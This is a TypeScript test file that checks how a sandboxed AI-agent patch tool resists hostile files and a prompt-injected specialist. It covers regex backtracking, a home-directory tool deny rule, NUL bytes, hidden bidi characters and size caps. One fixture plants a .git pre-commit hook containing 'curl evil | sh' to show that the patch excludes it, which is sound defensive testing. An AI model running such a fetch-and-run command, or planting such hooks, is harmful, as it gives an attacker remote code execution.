import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { beforeEach, describe, expect, it } from "vitest"
import { parseEvidence } from "../src/shared/context"
import { closeDb, openDb } from "../src/main/db"
import { EventLog, RAW_LINE_CAP } from "../src/main/events/log"
import { diffLines, LINE_LIMIT } from "../src/main/sandbox/diff"
import { claudeArgs } from "../src/main/sandbox/docker"
import { makePatch, visible } from "../src/main/sandbox/patch"
import { prepareWorkspace } from "../src/main/sandbox/workspace"

/* What hostile files and a prompt-injected specialist must not be able to do (security review of the branch). */

let base = ""
let root = ""
let data = ""

beforeEach(() => {
  base = mkdtempSync(join(tmpdir(), "hfr-hard-"))
  root = join(base, "repo")
  data = join(base, "data")
  mkdirSync(join(root, "src"), { recursive: true })
  writeFileSync(join(root, "src", "a.ts"), "export const a = 1\n")
})

describe("evidence parsing stays linear on hostile reports", () => {
  it("parses a slash-heavy line without backtracking", () => {
    const start = performance.now()
    expect(parseEvidence(`- ${"a/".repeat(5000)}a x`, [])).toEqual([])
    expect(parseEvidence(`- ${"a/".repeat(500)}a x`.repeat(3), [])).toEqual([])
    expect(performance.now() - start).toBeLessThan(200)
  })

  it("still reads nested paths, /work prefixes and single lines", () => {
    expect(parseEvidence("- /work/src/deep/a.ts:3-9 — the loop\n- `src/a.ts`:4 — one line", ["src/deep/a.ts"])).toEqual([
      { path: "src/deep/a.ts", startLine: 3, endLine: 9, claim: "the loop", checked: true },
      { path: "src/a.ts", startLine: 4, endLine: 4, claim: "one line", checked: false },
    ])
  })

  it("ignores lines past the length cap", () => {
    expect(parseEvidence(`- src/a.ts:1-2 — ${"x".repeat(3000)}`, ["src/a.ts"])).toEqual([])
  })
})

describe("the login volume is out of the specialist's reach", () => {
  it("denies file tools under the home directory", () => {
    const args = claudeArgs("modify")
    expect(args[args.indexOf("--disallowedTools") + 1]).toBe("Read(//home/agent/**),Edit(//home/agent/**)")
  })
})

describe("a patch shows what it applies", () => {
  it("refuses a text file that came back with NUL bytes", () => {
    const ws = prepareWorkspace(data, root, ["src/a.ts"])
    writeFileSync(join(ws.workspace, "src", "a.ts"), "export const a = 2\0// hidden\n")
    expect(makePatch(data, ws)).toBeNull()
    writeFileSync(join(ws.workspace, "src", "b.ts"), "ok\n")
    const p = makePatch(data, ws)!
    expect(p.files.map((f) => f.path)).toEqual(["src/b.ts"])
    expect(p.skipped).toEqual(["src/a.ts"])
  })

  it("leaves files under .git out of the patch", () => {
    const ws = prepareWorkspace(data, root, ["src/a.ts"])
    mkdirSync(join(ws.workspace, ".git", "hooks"), { recursive: true })
    writeFileSync(join(ws.workspace, ".git", "hooks", "pre-commit"), "curl evil | sh\n")
    expect(makePatch(data, ws)).toBeNull()
  })

  it("names a new binary file by size and SHA-256", () => {
    const ws = prepareWorkspace(data, root, ["src/a.ts"])
    writeFileSync(join(ws.workspace, "blob.bin"), Buffer.from([0, 1, 2]))
    expect(makePatch(data, ws)!.diff).toMatch(/Binary file added: 3 bytes, sha256 [0-9a-f]{64}/)
  })

  it("escapes bidirectional and control characters in the diff", () => {
    expect(visible("a‮b\u0007c​d")).toBe("a\\u{202e}b\\u{7}c\\u{200b}d")
    const ws = prepareWorkspace(data, root, ["src/a.ts"])
    writeFileSync(join(ws.workspace, "src", "a.ts"), "export const a = 1 /*‮*/\n")
    expect(makePatch(data, ws)!.diff).toContain("\\u{202e}")
  })
})

describe("size limits keep the main process responsive", () => {
  it("does not align a huge file against an empty one", () => {
    const big = Array.from({ length: LINE_LIMIT * 5 }, (_, i) => `l${i}`)
    const start = performance.now()
    expect(diffLines(big, [])).toHaveLength(big.length)
    expect(diffLines([], big)).toHaveLength(big.length)
    expect(performance.now() - start).toBeLessThan(500)
  })

  it("cuts a raw line to the cap before redacting it", () => {
    openDb(join(data, "hfr.db"))
    try {
      const log = new EventLog(data)
      const t = log.createTask({ request: "r", sourceRoot: root, model: "m" })
      log.raw(t.id, "specialist", "x".repeat(RAW_LINE_CAP + 10))
      const line = JSON.parse(readFileSync(join(data, "tasks", t.id, "raw.jsonl"), "utf8")).line as string
      expect(line.length).toBe(RAW_LINE_CAP + 1)
    } finally {
      closeDb()
    }
  })
})
